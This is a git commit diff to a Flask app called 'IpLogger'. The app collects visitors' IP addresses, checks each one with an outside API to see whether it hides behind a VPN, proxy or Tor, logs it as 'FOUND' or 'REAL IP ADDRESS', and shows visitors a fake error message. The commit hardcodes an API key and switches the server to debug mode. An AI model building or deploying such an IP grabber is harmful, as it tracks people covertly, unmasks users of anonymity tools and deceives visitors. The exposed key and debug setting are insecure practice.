2faa3837028770d6af39942c7e0a47cdcbc3c2be
AhmedWaleed22 <ahmedwaleedaboelamayem68@gmail.com>
2021-03-15 05:53:11 +0200

    Detecting Connection Type

--- IpLogger/app.py
+++ IpLogger/app.py
@@ -1,5 +1,6 @@
 from flask import Flask, render_template, request, redirect
 from termcolor import colored
+import requests as rq
 
 app = Flask(__name__)
 
@@ -10,8 +11,22 @@ def index():
 @app.route("/nextstep/", methods=["POST"])
 def nextstep():
     ipaddr = request.form.get("ip")
-    print(colored(f"[*] FOUND IP ADDRESS --- {ipaddr}", "cyan", attrs=["bold"]))
+    servicesList = []
+    serviceCheck = rq.get(f"https://vpnapi.io/api/{ipaddr}?key=F9J3K1V02MFO1C93KA7B").json()
+
+    if serviceCheck['security']['vpn'] == True:
+        servicesList.append('VPN')
+    elif serviceCheck['security']['proxy'] == True:
+        servicesList.append('PROXY')
+    elif serviceCheck['security']['tor'] == True:
+        servicesList.append('TOR')
+
+    if len(servicesList) < 1:
+        services = "REAL IP ADDRESS"
+    else:
+        services = ",".join(servicesList)
+    print(colored(f"[*] FOUND IP ADDRESS --- ({services}) {ipaddr}", "cyan", attrs=["bold"]))
     return "An Error Happend!"
 
 if __name__ == "__main__":
-    app.run(debug=False, port=80)
+    app.run(debug=True, port=80)
